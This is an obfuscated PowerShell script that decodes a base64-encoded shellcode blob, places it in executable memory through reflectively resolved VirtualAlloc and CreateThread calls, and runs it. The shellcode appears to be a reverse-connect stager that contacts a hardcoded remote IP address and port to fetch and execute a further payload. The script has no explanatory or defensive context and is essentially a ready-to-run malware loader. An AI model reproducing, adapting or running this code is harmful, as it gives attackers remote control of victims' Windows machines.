
function sIHb {
	Param ($cMz, $asx)		
	$kKAy = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $kKAy.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($kKAy.GetMethod('GetModuleHandle')).Invoke($null, @($cMz)))), $asx))
}

function t5 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $st,
		[Parameter(Position = 1)] [Type] $dPa = [Void]
	)
	
	$hQ7 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$hQ7.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $st).SetImplementationFlags('Runtime, Managed')
	$hQ7.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $dPa, $st).SetImplementationFlags('Runtime, Managed')
	
	return $hQ7.CreateType()
}

[Byte[]]$cBz = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACK4ke8ppkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$cdlXC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sIHb kernel32.dll VirtualAlloc), (t5 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $cBz.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($cBz, 0, $cdlXC, $cBz.length)

$frcXo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sIHb kernel32.dll CreateThread), (t5 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cdlXC,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sIHb kernel32.dll WaitForSingleObject), (t5 @([IntPtr], [Int32]))).Invoke($frcXo,0xffffffff) | Out-Null
